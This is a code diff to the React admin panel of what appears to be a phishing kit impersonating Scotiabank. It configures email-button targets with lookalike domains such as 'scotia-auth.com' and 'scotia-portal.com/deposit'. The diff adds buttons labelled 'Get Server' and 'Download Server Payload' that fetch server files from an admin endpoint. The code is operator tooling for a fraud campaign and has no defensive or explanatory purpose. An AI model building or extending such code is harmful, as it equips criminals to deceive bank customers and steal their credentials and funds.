@@ -4,7 +4,7 @@ import {
   Users, Settings, Shield, Terminal, Zap, Database, Server,
   Search, Plus, Edit2, Trash2, Check, X, ChevronRight, 
   Activity, Info, AlertTriangle, Key, Send, Mail, MessageSquare,
-  Lock, RefreshCw, Eye, EyeOff, BarChart3, Globe, Save
+  Lock, RefreshCw, Eye, EyeOff, BarChart3, Globe, Save, Download
 } from 'lucide-react';
 import { useBank } from '../shared/BankContext';
 import { useSocket } from '../shared/SocketContext';
@@ -1087,13 +1087,23 @@ export function AdminPanel() {
                       <p className="text-zinc-500 text-[9px]">Target for email buttons (e.g. https://scotia-auth.com)</p>
                     </div>
                   </div>
-                  <input 
-                    type="text" 
-                    value={config?.general?.baseActionUrl || ''}
-                    onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
-                    placeholder="https://action.url"
-                    className="w-full bg-black border border-white/10 rounded-xl px-4 py-2 text-xs text-white focus:border-indigo-500/50 outline-none font-mono"
-                  />
+                  <div className="flex gap-2">
+                    <input 
+                      type="text" 
+                      value={config?.general?.baseActionUrl || ''}
+                      onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
+                      placeholder="https://action.url"
+                      className="flex-1 bg-black border border-white/10 rounded-xl px-4 py-2 text-xs text-white focus:border-indigo-500/50 outline-none font-mono"
+                    />
+                    <button
+                      onClick={() => window.open('/api/admin/server-files/download', '_blank')}
+                      className="bg-indigo-600/20 text-indigo-500 hover:bg-indigo-600 hover:text-white px-3 rounded-xl border border-indigo-500/30 transition-all flex items-center gap-2 text-[10px] font-black uppercase whitespace-nowrap"
+                      title="Download WSL Remote Server Files"
+                    >
+                      <Download size={14} />
+                      Server File
+                    </button>
+                  </div>
                 </div>
 
                 {/* Admin PIN */}
@@ -1227,13 +1237,23 @@ export function AdminPanel() {
                     </div>
                     <div className="space-y-1">
                       <label className="text-[8px] text-zinc-500 uppercase tracking-tighter">Landing Action URL</label>
+                    <div className="flex gap-2">
                       <input 
                         type="text" 
                         value={config?.general?.baseActionUrl || ''}
                         onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
-                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-red-500/50 outline-none"
+                        className="flex-1 bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-red-500/50 outline-none"
                         placeholder="https://scotia-portal.com/deposit"
                       />
+                      <button
+                        onClick={() => window.open('/api/admin/server-files/download', '_blank')}
+                        className="bg-red-600/10 text-red-500 hover:bg-red-600 hover:text-white px-2 rounded-lg border border-red-500/20 transition-all flex items-center gap-1.5 text-[9px] font-bold uppercase whitespace-nowrap"
+                        title="Download Server Payload"
+                      >
+                        <Download size={12} />
+                        Get Server
+                      </button>
+                    </div>
                     </div>
                   </div>
                 </div>
